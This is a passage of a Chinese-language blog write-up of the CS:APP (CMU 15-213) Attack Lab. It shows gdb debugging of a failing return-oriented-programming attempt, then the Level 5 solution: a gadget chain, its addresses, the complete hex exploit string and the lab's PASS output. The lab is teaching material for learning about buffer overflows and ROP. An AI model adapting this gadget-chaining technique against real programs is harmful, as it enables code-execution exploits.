<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">rax</span><span style="color:#79B8FF">            0x1</span><span style="color:#79B8FF">                 1</span></span>
<span class="line"><span style="color:#B392F0">rbx</span><span style="color:#79B8FF">            0x7fffffffdce8</span><span style="color:#79B8FF">      140737488346344</span></span>
<span class="line"><span style="color:#B392F0">rcx</span><span style="color:#79B8FF">            0xbe</span><span style="color:#79B8FF">                190</span></span>
<span class="line"><span style="color:#B392F0">rdx</span><span style="color:#79B8FF">            0x59b997fa</span><span style="color:#79B8FF">          1505335290</span></span>
<span class="line"><span style="color:#B392F0">rsi</span><span style="color:#79B8FF">            0x30</span><span style="color:#79B8FF">                48</span></span>
<span class="line"><span style="color:#B392F0">rdi</span><span style="color:#79B8FF">            0x59b997fa</span><span style="color:#79B8FF">          1505335290</span></span>
<span class="line"><span style="color:#B392F0">rbp</span><span style="color:#79B8FF">            0x7fffffffdba0</span><span style="color:#79B8FF">      0x7fffffffdba0</span></span>
<span class="line"><span style="color:#B392F0">rsp</span><span style="color:#79B8FF">            0x7ffffff98da8</span><span style="color:#79B8FF">      0x7ffffff98da8</span></span>
<span class="line"><span style="color:#B392F0">r8</span><span style="color:#79B8FF">             0xa</span><span style="color:#79B8FF">                 10</span></span>
<span class="line"><span style="color:#B392F0">r9</span><span style="color:#79B8FF">             0x607890</span><span style="color:#79B8FF">            6322320</span></span>
<span class="line"><span style="color:#B392F0">r10</span><span style="color:#79B8FF">            0x77</span><span style="color:#79B8FF">                119</span></span>
<span class="line"><span style="color:#B392F0">r11</span><span style="color:#79B8FF">            0x246</span><span style="color:#79B8FF">               582</span></span>
<span class="line"><span style="color:#B392F0">r12</span><span style="color:#79B8FF">            0x4</span><span style="color:#79B8FF">                 4</span></span>
<span class="line"><span style="color:#B392F0">r13</span><span style="color:#79B8FF">            0x0</span><span style="color:#79B8FF">                 0</span></span>
<span class="line"><span style="color:#B392F0">r14</span><span style="color:#79B8FF">            0x0</span><span style="color:#79B8FF">                 0</span></span>
<span class="line"><span style="color:#B392F0">r15</span><span style="color:#79B8FF">            0x7ffff7ffd040</span><span style="color:#79B8FF">      140737354125376</span></span>
<span class="line"><span style="color:#B392F0">rip</span><span style="color:#79B8FF">            0x401802</span><span style="color:#79B8FF">            0x401802</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">touch2+2</span><span style="color:#F97583">2></span></span>
<span class="line"><span style="color:#B392F0">--Type</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">RE</span><span style="color:#E1E4E8">T</span><span style="color:#F97583">></span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> more,</span><span style="color:#9ECBFF"> q</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> quit,</span><span style="color:#9ECBFF"> c</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> continue</span><span style="color:#9ECBFF"> without</span><span style="color:#9ECBFF"> paging--</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">x/16gx</span><span style="color:#E1E4E8"> $rsp</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98da8:</span><span style="color:#79B8FF"> 0x00000000004017ec</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f400</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98db8:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98dc8:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98dd8:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98de8:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98df8:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98e08:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span>
<span class="line"><span style="color:#B392F0">0x7ffffff98e18:</span><span style="color:#79B8FF"> 0xf4f4f4f4f4f4f4f4</span><span style="color:#79B8FF">      0xf4f4f4f4f4f4f4f4</span></span></code></pre>
<p>这里推荐一个软件<code>Beyond Compare</code>。
<img src="https://s2.loli.net/2025/08/18/4wK2YdaZDU3Mbvy.png" alt="compare" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/18/4wK2YdaZDU3Mbvy.png?w=640 640w, https://s2.loli.net/2025/08/18/4wK2YdaZDU3Mbvy.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>可见这里主要是rsp的值相差很多，其次是rax，rcx的值不相同。可以考虑rsp的值为偏移加调用ret数量不同的结果，rax为调用命令导致的cookie存放，但无法解释rcx的变化，考虑display $rcs，重新运行执行PASS，FAILED版本的exploit string。</p>
<p>可见rcx稳定的保持在214与190。考虑查看哪里修改了它</p>
<p>查询到Gets函数中更改了rcx</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span> ~│</span></span>
<span class="line"><span> 1│ Dump of assembler code for function getbuf:</span></span>
<span class="line"><span> 2│ buf.c:</span></span>
<span class="line"><span> 3│ 12      in buf.c</span></span>
<span class="line"><span> 4│    0x00000000004017a8 &#x3C;+0>:     sub    $0x28,%rsp</span></span>
<span class="line"><span> 5│    </span></span>
<span class="line"><span> 6│ 13      in buf.c</span></span>
<span class="line"><span> 7│ 14      in buf.c</span></span>
<span class="line"><span> 8│    0x00000000004017ac &#x3C;+4>:     mov    %rsp,%rdi</span></span>
<span class="line"><span> 9├──> 0x00000000004017af &#x3C;+7>:     call   0x401b60 &#x3C;Gets></span></span>
<span class="line"><span>10│ </span></span>
<span class="line"><span>11│ 15      in buf.c</span></span>
<span class="line"><span>12│ 16      in buf.c</span></span>
<span class="line"><span>13│    0x00000000004017b4 &#x3C;+12>:    mov    $0x1,%eax</span></span>
<span class="line"><span>14│    0x00000000004017b9 &#x3C;+17>:    add    $0x28,%rsp</span></span>
<span class="line"><span>15│    0x00000000004017bd &#x3C;+21>:    ret</span></span>
<span class="line"><span>16│ End of assembler dump.</span></span></code></pre>
<p>从中找出原因超出了目前我的技术水平，从调用栈中<code>chk</code>字样只能猜测其对ROP的构造做了检查然后直接触发了SIGSEGV信号。</p>
<h3 id="level-5">Level 5</h3>
<blockquote>
<p>You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.</p>
</blockquote>
<p><em><strong>HAHAHA!</strong></em>,还要再战！简直就是提振精神的。</p>
<p>Level5 要求与Level3 相同，使用cookie字符串指针调用touch3</p>
<p><code>Tips</code>：</p>
<ol>
<li>需要八个gadgets</li>
<li>用到movl</li>
</ol>
<p>review一下level3的代码</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>movq	$0x5561dca8, %rdi</span></span>
<span class="line"><span>pushq	$0x4018fa</span></span>
<span class="line"><span>ret</span></span></code></pre>
<p>这里可能已经忘记了0x5561dca8是什么，这是cookie存在栈中的地址，而0x4018fa是touch3的地址</p>
<blockquote>
<p><code>nm ./rtarget | grep</code>可以发现touch3的地址是一样的。</p>
</blockquote>
<p>应该如何存放cookie？注意这里存放的时候同样要考虑touch3中对栈的随机占用问题。</p>
<p>如果将其放置在栈中，我们将不知道cookie的地址。唯一相关的方式是获取rsp的地址值然后计算好偏移量。</p>
<p>构造一下相关的汇编代码</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>movq %rsp %rax</span></span>
<span class="line"><span>movq %rax %rdi</span></span>
<span class="line"><span>popq %rax # 取偏移地址</span></span>
<span class="line"><span>movl %eax %edi</span></span>
<span class="line"><span>movl %ecx %esi</span></span>
<span class="line"><span>lea    (%rdi,%rsi,1),%rax</span></span>
<span class="line"><span>movq %rax, %rdi</span></span></code></pre>
<p>找一找相关的gadget</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>401aad: movq %rsp %rax # 此时rsp已经弹出一个值</span></span>
<span class="line"><span>4019a2: movq %rax %rdi</span></span>
<span class="line"><span>        0x48 # 偏移地址</span></span>
<span class="line"><span>4079cc: popq %rax # 取偏移地址</span></span>
<span class="line"><span>4019dd: movl %eax %edx</span></span>
<span class="line"><span>401a70: movl %edx %ecx </span></span>
<span class="line"><span>401a13: movl %ecx %esi</span></span>
<span class="line"><span>4019d6: lea  (%rdx,%rsi,1),%rax</span></span>
<span class="line"><span>4019a2: movq %rax, %rdi</span></span>
<span class="line"><span>        35 39 62 39 39 37 66 61 # Cookie</span></span>
<span class="line"><span></span></span></code></pre>
<p><img src="https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png" alt="level5" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png?w=640 640w, https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>构造</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">ad</span><span style="color:#9ECBFF"> 1a</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">a2</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">cc</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">48</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">dd</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">70</span><span style="color:#9ECBFF"> 1a</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">13</span><span style="color:#9ECBFF"> 1a</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">d6</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">a2</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">fa</span><span style="color:#79B8FF"> 18</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">35</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 62</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 37</span><span style="color:#79B8FF"> 66</span><span style="color:#79B8FF"> 61</span></span></code></pre>
<p><em><strong>最终</strong></em></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./rtarget</span><span style="color:#79B8FF"> -q</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> rtarget.l5.txt)</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Touch3!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> called</span><span style="color:#9ECBFF"> touch3</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">"59b997fa"</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">Valid</span><span style="color:#9ECBFF"> solution</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> level</span><span style="color:#79B8FF"> 3</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> target</span><span style="color:#9ECBFF"> rtarget</span></span>
<span class="line"><span style="color:#B392F0">PASS:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:PASS:0xffffffff:rtarget:3:00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> AD</span><span style="color:#9ECBFF"> 1A</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> A2</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> CC</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 48</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> DD</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 70</span><span style="color:#9ECBFF"> 1A</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 13</span><span style="color:#9ECBFF"> 1A</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> D6</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> A2</span><span style="color:#79B8FF"> 19</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> FA</span><span style="color:#79B8FF"> 18</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 35</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 62</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 37</span><span style="color:#79B8FF"> 66</span><span style="color:#79B8FF"> 61</span></span></code></pre>
<p>ALL OVER</p>
<h2 id="ref">REF</h2>
<ol>
<li><a href="https://csapp.cs.cmu.edu/3e/attacklab.pdf">https://csapp.cs.cmu.edu/3e/attacklab.pdf</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/476396465">https://zhuanlan.zhihu.com/p/476396465</a></li>
</ol> </article>  </div> </article> </main> <footer class="border-t border-gray-200 bg-white text-center py-4 mt-8"> <p class="text-sm text-gray-500">
© 2025 我的博客
</p> </footer> </body></html>